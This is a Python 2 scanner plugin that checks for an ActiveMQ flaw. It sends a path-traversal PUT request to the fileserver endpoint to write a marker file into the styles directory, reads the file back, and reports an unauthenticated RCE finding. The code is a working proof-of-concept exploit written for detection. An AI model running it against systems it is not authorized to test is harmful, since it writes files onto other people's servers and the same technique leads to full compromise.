# coding:utf-8
import socket
import time
import urllib2
import random
from config import is_port_open, is_http



def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str1


@is_port_open
def verify(ip, port=80, name=None, timeout=10):
    if is_http(ip, int(port)) is False:
        return
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        filename = random_str(6)
        flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n"%(filename)
        s.send(flag)
        time.sleep(1)
        s.recv(1024)
        s.close()
        url = 'http://' + ip + ":" + str(port) + '/styles/%s.txt'%(filename)
        res_html = urllib2.urlopen(url, timeout=timeout).read(1024)
        if 'xxscan0' in res_html:
            info = {
                "url": url,
                "vuln_name": "ActiveMQ unauthenticated RCE",
                "severity": "high",
                "proof": url
            }
            return info
    except Exception as e:
        print "[poc_activemq_upload] [line 37] [error={}]".format(repr(e))
        # pass
